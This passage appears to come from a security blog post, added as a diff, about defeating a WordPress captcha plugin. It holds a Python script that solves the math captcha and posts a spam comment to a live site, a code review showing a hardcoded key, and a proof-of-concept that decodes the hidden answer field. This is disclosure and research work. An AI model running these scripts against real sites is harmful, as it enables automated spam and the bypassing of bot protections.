+        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;HTTP Error:&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+
+        <span class="c"># Parse parameters and solve captcha</span>
+
+        <span class="n">dom</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">))</span>
+        <span class="n">el</span> <span class="o">=</span> <span class="n">dom</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="s">&#39;cptch_block&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">captcha</span> <span class="o">=</span> <span class="n">el</span><span class="o">.</span><span class="n">text_content</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">solution</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">whitelist</span><span class="p">(</span><span class="n">captcha</span><span class="p">))</span>
+
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">el</span><span class="o">.</span><span class="n">getchildren</span><span class="p">():</span>
+                <span class="k">try</span><span class="p">:</span>
+                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;cptch_result&#39;</span><span class="p">:</span>
+                                <span class="n">result</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
+                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;cptch_time&#39;</span><span class="p">:</span>
+                                <span class="n">time</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
+                <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
+                        <span class="k">pass</span>
+
+        <span class="n">el</span><span class="o">=</span> <span class="n">dom</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="s">&#39;form-submit&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">el</span><span class="o">.</span><span class="n">getchildren</span><span class="p">():</span>
+                <span class="k">try</span><span class="p">:</span>
+                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;comment_post_ID&#39;</span><span class="p">:</span>
+                                <span class="n">post_id</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
+                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;comment_parent&#39;</span><span class="p">:</span>
+                                <span class="n">comment_parent</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
+                <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
+                        <span class="k">pass</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">&quot;[+] Solution of captcha &#39;</span><span class="si">%s</span><span class="s">&#39; is </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="n">solution</span><span class="p">))</span>
+
+        <span class="c"># No write a comment with the cracked captcha to proof that we provided the</span>
+        <span class="c"># correct solution.</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;author&#39;</span><span class="p">:</span> <span class="s">&#39;spammer&#39;</span><span class="p">,</span> <span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="s">&#39;spammer@spamhouse.org&#39;</span><span class="p">,</span> <span class="s">&#39;url&#39;</span><span class="p">:</span> <span class="s">&#39;http://spamming.com&#39;</span><span class="p">,</span>
+        <span class="s">&#39;cptch_result&#39;</span><span class="p">:</span> <span class="n">result</span><span class="p">,</span> <span class="s">&#39;cptch_time&#39;</span><span class="p">:</span> <span class="n">time</span><span class="p">,</span> <span class="s">&#39;cptch_number&#39;</span><span class="p">:</span> <span class="n">solution</span><span class="p">,</span>
+        <span class="s">&#39;comment&#39;</span><span class="p">:</span> <span class="s">&quot;Hi there! No protection from spammers!!!:D&quot;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Post+Comment&#39;</span><span class="p">,</span>
+        <span class="s">&#39;comment_post_ID&#39;</span><span class="p">:</span> <span class="n">post_id</span><span class="p">,</span> <span class="s">&#39;comment_parent&#39;</span><span class="p">:</span> <span class="n">comment_parent</span><span class="p">}</span>
+
+        <span class="k">try</span><span class="p">:</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&quot;http://incolumitas.com/wp-comments-post.php&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">cerr</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Network problem occured&#39;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">terr</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Connection timeout&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;HTTP Error:&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="s">&#39;&#39;&#39;Error: You have entered an incorrect CAPTCHA value.&#39;&#39;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;[-] Captcha cracking was not successful&#39;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;[+] Comment submitted&#39;</span><span class="p">)</span>
+</pre></div>
+
+
+<p>That seems to work surprisingly well. Without even reading the code, the
+captcha plugin is totally broken using the upper approach. The above
+code simply parses every mathematical equation (The plugin always severs
+equations) and assembles them to strings the feeds python built-in
+eval(). We then iterate the expression from zero to 10000 and substitute
+the for loop variable into the expression. If the math expression
+becomes true, we found the variable and therefore the solution. Really
+easy. Well the plugin is broken, that's proved, but I have this strange
+insight that I might be on the track to reveal a twofold broken app :P
+(It's 04:00 in the morning here, maybe that's why I am writing so
+chesty)</p>
+<h3>Whiteboxing - Code assessment</h3>
+<p>Let's review the source code of the plugin.</p>
+<p>You also want to have a glance on the code?
+<a href="http://plugins.svn.wordpress.org/captcha/tags/3.8.7/captcha.php" title="the code">Here</a>
+you go.<br />
+My very first impression was quite positive (Besides already knowing
+that the plugin was useless :/). The author seems to posses a profound
+understanding of the wordpress API, he uses lot's of hooks (filters and
+actions) and structures the code on the first glimpse very nicely. I
+know from own experience that writing code for wordpress is not always
+easy. But let's look at the critical part. The captcha is generated by
+the function cptch_display_captcha_custom(). For your convenience, I
+will list it here:</p>
+<div class="highlight"><pre><span class="x">// Functionality of the captcha logic work for custom form</span>
+<span class="x">if ( ! function_exists( &#39;cptch_display_captcha_custom&#39; ) ) {</span>
+<span class="x">    function cptch_display_captcha_custom() {</span>
+<span class="x">        global $cptch_options, $str_key, $cptch_time;</span>
+<span class="x">        $content = &quot;&quot;;</span>
+
+<span class="x">        // In letters presentation of numbers 0-9</span>
+<span class="x">        $number_string = array(); </span>
+<span class="x">        $number_string[0] = __( &#39;zero&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[1] = __( &#39;one&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[2] = __( &#39;two&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[3] = __( &#39;three&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[4] = __( &#39;four&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[5] = __( &#39;five&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[6] = __( &#39;six&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[7] = __( &#39;seven&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[8] = __( &#39;eight&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_string[9] = __( &#39;nine&#39;, &#39;captcha&#39; ); </span>
+<span class="x">        // In letters presentation of numbers 11 -19</span>
+<span class="x">        $number_two_string = array();</span>
+<span class="x">        $number_two_string[1] = __( &#39;eleven&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_two_string[2] = __( &#39;twelve&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_two_string[3] = __( &#39;thirteen&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_two_string[4] = __( &#39;fourteen&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_two_string[5] = __( &#39;fifteen&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_two_string[6] = __( &#39;sixteen&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_two_string[7] = __( &#39;seventeen&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_two_string[8] = __( &#39;eighteen&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_two_string[9] = __( &#39;nineteen&#39;, &#39;captcha&#39; );</span>
+<span class="x">        // In letters presentation of numbers 10, 20, 30, 40, 50, 60, 70, 80, 90</span>
+<span class="x">        $number_three_string = array();</span>
+<span class="x">        $number_three_string[1] = __( &#39;ten&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_three_string[2] = __( &#39;twenty&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_three_string[3] = __( &#39;thirty&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_three_string[4] = __( &#39;forty&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_three_string[5] = __( &#39;fifty&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_three_string[6] = __( &#39;sixty&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_three_string[7] = __( &#39;seventy&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_three_string[8] = __( &#39;eighty&#39;, &#39;captcha&#39; );</span>
+<span class="x">        $number_three_string[9] = __( &#39;ninety&#39;, &#39;captcha&#39; );</span>
+<span class="x">        // The array of math actions</span>
+<span class="x">        $math_actions = array();</span>
+
+<span class="x">        // If value for Plus on the settings page is set</span>
+<span class="x">        if( 1 == $cptch_options[&#39;cptch_math_action_plus&#39;] )</span>
+<span class="x">            $math_actions[] = &#39;+&#39;;</span>
+<span class="x">        // If value for Minus on the settings page is set</span>
+<span class="x">        if( 1 == $cptch_options[&#39;cptch_math_action_minus&#39;] )</span>
+<span class="x">            $math_actions[] = &#39;−&#39;;</span>
+<span class="x">        // If value for Increase on the settings page is set</span>
+<span class="x">        if( 1 == $cptch_options[&#39;cptch_math_action_increase&#39;] )</span>
+<span class="x">            $math_actions[] = &#39;×&#39;;</span>
+
+<span class="x">        // Which field from three will be the input to enter required value</span>
+<span class="x">        $rand_input = rand( 0, 2 );</span>
+<span class="x">        // Which field from three will be the letters presentation of numbers</span>
+<span class="x">        $rand_number_string = rand( 0, 2 );</span>
+<span class="x">        // If don&#39;t check Word in setting page - $rand_number_string not display</span>
+<span class="x">        if( 0 == $cptch_options[&quot;cptch_difficulty_word&quot;])</span>
+<span class="x">            $rand_number_string = -1;</span>
+<span class="x">        // Set value for $rand_number_string while $rand_input = $rand_number_string</span>
+<span class="x">        while($rand_input == $rand_number_string) {</span>
+<span class="x">            $rand_number_string = rand( 0, 2 );</span>
+<span class="x">        }</span>
+<span class="x">        // What is math action to display in the form</span>
+<span class="x">        $rand_math_action = rand( 0, count($math_actions) - 1 );</span>
+
+<span class="x">        $array_math_expretion = array();</span>
+
+<span class="x">        // Add first part of mathematical expression</span>
+<span class="x">        $array_math_expretion[0] = rand( 1, 9 );</span>
+<span class="x">        // Add second part of mathematical expression</span>
+<span class="x">        $array_math_expretion[1] = rand( 1, 9 );</span>
+<span class="x">        // Calculation of the mathematical expression result</span>
+<span class="x">        switch( $math_actions[$rand_math_action] ) {</span>
+<span class="x">            case &quot;+&quot;:</span>
+<span class="x">                $array_math_expretion[2] = $array_math_expretion[0] + $array_math_expretion[1];</span>
+<span class="x">                break;</span>
+<span class="x">            case &quot;−&quot;:</span>
+<span class="x">                // Result must not be equal to the negative number</span>
+<span class="x">                if($array_math_expretion[0] &lt; $array_math_expretion[1]) {</span>
+<span class="x">                    $number                                     = $array_math_expretion[0];</span>
+<span class="x">                    $array_math_expretion[0]    = $array_math_expretion[1];</span>
+<span class="x">                    $array_math_expretion[1]    = $number;</span>
+<span class="x">                }</span>
+<span class="x">                $array_math_expretion[2] = $array_math_expretion[0] - $array_math_expretion[1];</span>
+<span class="x">                break;</span>
+<span class="x">            case &quot;×&quot;:</span>
+<span class="x">                $array_math_expretion[2] = $array_math_expretion[0] * $array_math_expretion[1];</span>
+<span class="x">                break;</span>
+<span class="x">        }</span>
+
+<span class="x">        // String for display</span>
+<span class="x">        $str_math_expretion = &quot;&quot;;</span>
+<span class="x">        // First part of mathematical expression</span>
+<span class="x">        if( 0 == $rand_input )</span>
+<span class="x">            $str_math_expretion .= &quot;&quot;;</span>
+<span class="x">        else if ( 0 == $rand_number_string || 0 == $cptch_options[&quot;cptch_difficulty_number&quot;] )</span>
+<span class="x">            $str_math_expretion .= $number_string[$array_math_expretion[0]];</span>
+<span class="x">        else</span>
+<span class="x">            $str_math_expretion .= $array_math_expretion[0];</span>
+
+<span class="x">        // Add math action</span>
+<span class="x">        $str_math_expretion .= &quot; &quot;.$math_actions[$rand_math_action];</span>
+
+<span class="x">        // Second part of mathematical expression</span>
+<span class="x">        if( 1 == $rand_input )</span>
+<span class="x">            $str_math_expretion .= &quot; &quot;;</span>
+<span class="x">        else if ( 1 == $rand_number_string || 0 == $cptch_options[&quot;cptch_difficulty_number&quot;] )</span>
+<span class="x">            $str_math_expretion .= &quot; &quot;. $number_string[$array_math_expretion[1]];</span>
+<span class="x">        else</span>
+<span class="x">            $str_math_expretion .= &quot; &quot;.$array_math_expretion[1];</span>
+
+<span class="x">        // Add =</span>
+<span class="x">        $str_math_expretion .= &quot; = &quot;;</span>
+
+<span class="x">        // Add result of mathematical expression</span>
+<span class="x">        if( 2 == $rand_input ) {</span>
+<span class="x">            $str_math_expretion .= &quot; &quot;;</span>
+<span class="x">        } else if ( 2 == $rand_number_string || 0 == $cptch_options[&quot;cptch_difficulty_number&quot;] ) {</span>
+<span class="x">            if( $array_math_expretion[2] &lt; 10 )</span>
+<span class="x">                $str_math_expretion .= &quot; &quot;. $number_string[$array_math_expretion[2]];</span>
+<span class="x">            else if( $array_math_expretion[2] &lt; 20 &amp;&amp; $array_math_expretion[2] &gt; 10 )</span>
+<span class="x">                $str_math_expretion .= &quot; &quot;. $number_two_string[ $array_math_expretion[2] % 10 ];</span>
+<span class="x">            else {</span>
+<span class="x">                if ( get_bloginfo( &#39;language&#39;,&#39;Display&#39; ) == &quot;nl-NL&quot; ) {</span>
+<span class="x">                    $str_math_expretion .= &quot; &quot;.( 0 != $array_math_expretion[2] % 10 ? $number_string[ $array_math_expretion[2] % 10 ] . __( &quot;and&quot;, &#39;captcha&#39; ) : &#39;&#39; ) . $number_three_string[ $array_math_expretion[2] / 10 ];</span>
+<span class="x">                } else {</span>
+<span class="x">                    $str_math_expretion .= &quot; &quot; . $number_three_string[ $array_math_expretion[2] / 10 ].&quot; &quot;.( 0 != $array_math_expretion[2] % 10 ? $number_string[ $array_math_expretion[2] % 10 ] : &#39;&#39;);</span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">        } else {</span>
+<span class="x">            $str_math_expretion .= $array_math_expretion[2];</span>
+<span class="x">        }</span>
+<span class="x">        // Add hidden field with encoding result</span>
+<span class="x">        $content .= &#39;</span>
+
+<span class="x">        &#39;;</span>
+<span class="x">        $content .= $str_math_expretion; </span>
+<span class="x">        return $content;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>What can we see on the first view? The author declares several arrays
+holding integer strings on a rather painful way. He then continues to
+build the maths equation captcha with a variable called
+<code>$array_math_expretion</code> (Introduced on line 68). I am pretty sure he
+means <code>$array_math_expression</code>. But shit happens. I mean the plugin
+is only 2.5 years old and in the very early version 3.8.7. Who cares
+about grammar anyways?</p>
+<p>Lot's of hard understandable code follows. Some random integers are
+obtained to built the fancy <em>expretion</em>. And, wait, what's that on line
+80?!</p>
+<div class="highlight"><pre><span class="x">// Result must not be equal to the negative number</span>
+<span class="x">if($array_math_expretion[0] &lt; $array_math_expretion[1]) {</span>
+<span class="x">   $number = $array_math_expretion[0];</span>
+<span class="x">   $array_math_expretion[0] = $array_math_expretion[1];</span>
+<span class="x">   $array_math_expretion[1] = $number;</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>The author prevents the subtraction to become negative on a cumbersome
+way. Really?! Is the missing associative property that hard to work
+around?</p>
+<p>Well let's go further. I really don't care how exactly the mathematical
+expression is built, I just know that it infinitely sucks.</p>
+<p>Consider the final lines 135 to 140. There the captcha answer is
+<em>encoded</em> and then injected into the form where the user has to enter
+the captcha. Normally injecting encrypted hidden input fields is a
+common technique among web developers. But only under the supposition
+that the hidden field values are properly encrypted. Let's see if the
+author did so. That being said we have a look at the function encode():</p>
+<div class="highlight"><pre><span class="x">// Function for encodinf number</span>
+<span class="x">if ( ! function_exists( &#39;encode&#39; ) ) {</span>
+<span class="x">    function encode( $String, $Password, $cptch_time ) {</span>
+<span class="x">        // Check if key for encoding is empty</span>
+<span class="x">        if ( ! $Password ) die ( __( &quot;Encryption password is not set&quot;, &#39;captcha&#39; ) );</span>
+
+<span class="x">        $Salt = md5( $cptch_time, true );</span>
+<span class="x">        $String = substr( pack( &quot;H*&quot;, sha1( $String ) ), 0, 1 ).$String;</span>
+<span class="x">        $StrLen = strlen( $String );</span>
+<span class="x">        $Seq = $Password;</span>
+<span class="x">        $Gamma  = &#39;&#39;;</span>
+<span class="x">        while ( strlen( $Gamma ) &lt; $StrLen ) {</span>
+<span class="x">                $Seq = pack( &quot;H*&quot;, sha1( $Seq . $Gamma . $Salt ) );</span>
+<span class="x">                $Gamma.=substr( $Seq, 0, 8 );</span>
+<span class="x">        }</span>
+
+<span class="x">        return base64_encode( $String ^ $Gamma );</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>Again, before I even would dig deeper into the encoding function, I want
+to know how it is called. Maybe the input parameters are predictable. Oh
+boy, they are. The encoding function on line 136 in the previous code
+snippet is called with two global variables, a timestamp and a
+<em>password</em>, as well as the captcha expression string:</p>
+<div class="highlight"><pre><span class="x">$str_key //the password</span>
+<span class="x">$cptch_time // the timestamp</span>
+</pre></div>
+
+
+<p>These variables (the freaking password!) are initialized at the
+beginning of the plugin to the following values:</p>
+<div class="highlight"><pre><span class="x">// Add global setting for Captcha</span>
+<span class="x">global $wpmu, $str_key, $cptch_time;</span>
+<span class="x">$str_key = &quot;bws_3110013&quot;;</span>
+<span class="x">$cptch_time = time();</span>
+</pre></div>
+
+
+<p>Well, what does that mean?</p>
+<p>Whenever a captcha is generated, the captcha answer is <em>encrypted</em> with
+a fully exposed password (<em>bws_3110013</em>) and a known timestamp (The
+timestamp is known because it is also sent as hidden field in the form).
+That means we can just apply the decode() function on the hidden values
+whenever we fill out a form and can thus calculate the captcha answer
+ourselves with the hidden input parameters! BOOM, captcha solved without
+even applying OCR techniques (As far as parsing theses simple equations
+counts as OCR).</p>
+<p>Here for completeness sake the decode() function (I honestly cannot say
+whether the encryption level is good, because I don't have profound
+knowledge of cryptography, but it does look very weak to me. Could you
+elaborate on it? Leave me a comment :P):</p>
+<div class="highlight"><pre><span class="x">// Function for decoding number</span>
+<span class="x">if ( ! function_exists( &#39;decode&#39; ) ) {</span>
+<span class="x">    function decode( $String, $Key, $cptch_time ) {</span>
+<span class="x">        // Check if key for encoding is empty</span>
+<span class="x">        if ( ! $Key ) die ( __( &quot;Decryption password is not set&quot;, &#39;captcha&#39; ) );</span>
+
+<span class="x">        $Salt = md5( $cptch_time, true );</span>
+<span class="x">        $StrLen = strlen( $String );</span>
+<span class="x">        $Seq = $Key;</span>
+<span class="x">        $Gamma  = &#39;&#39;;</span>
+<span class="x">        while ( strlen( $Gamma ) &lt; $StrLen ) {</span>
+<span class="x">                $Seq = pack( &quot;H*&quot;, sha1( $Seq . $Gamma . $Salt ) );</span>
+<span class="x">                $Gamma.= substr( $Seq, 0, 8 );</span>
+<span class="x">        }</span>
+
+<span class="x">        $String = base64_decode( $String );</span>
+<span class="x">        $String = $String^$Gamma;</span>
+
+<span class="x">        $DecodedString = substr( $String, 1 );</span>
+<span class="x">        $Error = ord( substr( $String, 0, 1 ) ^ substr( pack( &quot;H*&quot;, sha1( $DecodedString ) ), 0, 1 ));</span>
+
+<span class="x">        if ( $Error ) </span>
+<span class="x">            return false;</span>
+<span class="x">        else </span>
+<span class="x">            return $DecodedString;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>I should prove my above allegations? I will terminate my experiments
+soon and then I'll post a exploitation of this weakness written in
+Python. I will also add this POC on my github account. But for now the
+explanation above will suffice.</p>
+<p><strong>Edit: As promised, here is the code that reverses the decode
+function:</strong></p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">lxml.html</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="c"># A blog post site that needs to have the plugin http://wordpress.org/plugins/captcha/ enabled and </span>
+<span class="c"># should have a open comment form. This &#39;attack&#39; works on every form that the plugin supports [E.g. registration,</span>
+<span class="c"># login, ...]. This renders the captcha completely useless.</span>
+
+<span class="c"># Author: Nikolai Tschacher</span>
+<span class="c"># Date: 07.11.2013</span>
+
+<span class="c"># tested on my local lamp with version 3.8.7</span>
+<span class="n">TARGET</span> <span class="o">=</span> <span class="s">&quot;http://localhost/~nikolai/wordpress/?p=1&quot;</span> <span class="c"># The landing site.</span>
+<span class="n">COMMENT_POST</span> <span class="o">=</span> <span class="s">&quot;http://localhost/~nikolai/wordpress/wp-comments-post.php&quot;</span> <span class="c"># The comment form to send POST requests at.</span>
+<span class="n">KEY</span> <span class="o">=</span> <span class="s">&quot;bws_3110013&quot;</span>
+
+<span class="k">def</span> <span class="nf">no_plugin</span><span class="p">(</span><span class="n">reason</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">&#39;The plugin hidden fields couldn</span><span class="se">\&#39;</span><span class="s">t be located. Make sure it is installed. Reason: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">reason</span><span class="p">))</span>
+    <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c"># This function reverses essentially the encoding of the hidden field cptch_result.</span>
+<span class="c"># It is exactly the same function with the same password as in the plugin source code.</span>
+<span class="k">def</span> <span class="nf">reverse</span><span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">cptch_time</span><span class="p">):</span>
+    <span class="c"># just convert all but the captcha string to ascii</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">)</span>
+    <span class="n">cptch_time</span> <span class="o">=</span> <span class="n">cptch_time</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">&#39;[i] Trying to decode key: {}, captcha: {} and cptch_time: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">cptch_time</span><span class="p">))</span>
+
+    <span class="n">d</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+    <span class="n">d</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">cptch_time</span><span class="p">)</span>
+    <span class="n">salt</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+
+    <span class="n">slen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">captcha</span><span class="p">)</span>
+    <span class="n">seq</span> <span class="o">=</span> <span class="n">key</span>
+    <span class="n">gamma</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">gamma</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">slen</span><span class="p">:</span>
+        <span class="n">sha</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+        <span class="n">L</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+        <span class="n">L</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span>
+        <span class="n">L</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">gamma</span><span class="p">)</span>
+        <span class="n">L</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">salt</span><span class="p">)</span>
+        <span class="n">sha</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">L</span><span class="p">)</span>
+        <span class="n">seq</span> <span class="o">=</span> <span class="n">sha</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+        <span class="n">gamma</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">seq</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
+
+    <span class="n">decoded</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">captcha</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="s">&#39;utf-8&#39;</span><span class="p">));</span>
+    <span class="k">for</span> <span class="n">c</span><span class="p">,</span> <span class="n">cc</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="n">gamma</span><span class="p">):</span>
+        <span class="n">decoded</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">cc</span><span class="p">))</span>
+    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+        <span class="c"># Obtain post parameters from comment form</span>
+        <span class="k">try</span><span class="p">:</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">cerr</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Network problem occured: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cerr</span><span class="p">))</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">terr</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Connection timeout: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">terr</span><span class="p">))</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;HTTP Error:&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+
+        <span class="c"># Parse parameters and solve captcha</span>
+
+        <span class="n">dom</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">))</span>
